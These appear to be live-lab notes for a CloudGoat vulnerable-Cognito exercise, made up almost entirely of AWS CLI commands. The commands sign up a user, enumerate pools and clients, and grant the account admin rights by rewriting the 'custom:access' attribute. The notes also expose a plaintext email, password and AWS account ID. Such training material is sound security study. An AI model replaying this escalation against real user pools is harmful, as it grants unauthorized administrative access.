# Link Lab en vivo

https://youtu.be/DdSCAYm_5KE

```bash
aws cognito-idp sign-up \
  --client-id <AppClientID> \
  --username <UserEmail> \
  --password <UserPassword> \
  --user-attributes Name="name",Value="<FirstName>" Name="family_name",Value="<LastName>" Name="email",Value="<UserEmail>"

aws cognito-idp sign-up \
  --client-id 6es9k6pj8ibjgqk5ct5n2sgaa0 \
  --username "josefloressv@outlook.com" \
  --password "dr!T*bnLB8VTHzv7" \
  --user-attributes Name="given_name",Value="Juan" Name="family_name",Value="Perez" Name="email",Value="josefloressv@outlook.com"

# apigateway_url = "https://afzfnluryf.execute-api.us-east-1.amazonaws.com/vulncognito/cognitoctf-vulnerablecognitocgidk9fav7d00b/index.html"
# cloudgoat_output_aws_account_id = "891377194814"

# Get the AppClientID
aws cognito-idp list-user-pools --max-results 20
aws cognito-idp describe-user-pool --user-pool-id <UserPoolId>
aws cognito-idp describe-user-pool --user-pool-id us-east-1_4WWZ5B9Ir
aws cognito-idp list-user-pool-clients --user-pool-id <UserPoolId>
aws cognito-idp list-user-pool-clients --user-pool-id us-east-1_4WWZ5B9Ir

"ClientId": "6es9k6pj8ibjgqk5ct5n2sgaa0",

# Confirm the user
aws cognito-idp admin-confirm-sign-up \
  --user-pool-id <UserPoolId> \
  --username "josefloressv@outlook.com"

aws cognito-idp admin-confirm-sign-up \
  --user-pool-id us-east-1_4WWZ5B9Ir \
  --username "josefloressv@outlook.com"

aws cognito-idp get-user --access-token eyJ...

aws cognito-idp update-user-attributes --access-token eyJ... --user-attributes '{"Name": "custom:access","Value": "admin"}'

# Get Idetity ID not working
aws cognito-identity get-id \
    --identity-pool-id us-east-1:9caa0820-8194-47fd-ba5c-f6533743ac82 \
    --logins '{"cognito-idp.us-east-1.amazonaws.com/us-east-1_4WWZ5B9Ir": "eyJ...'
```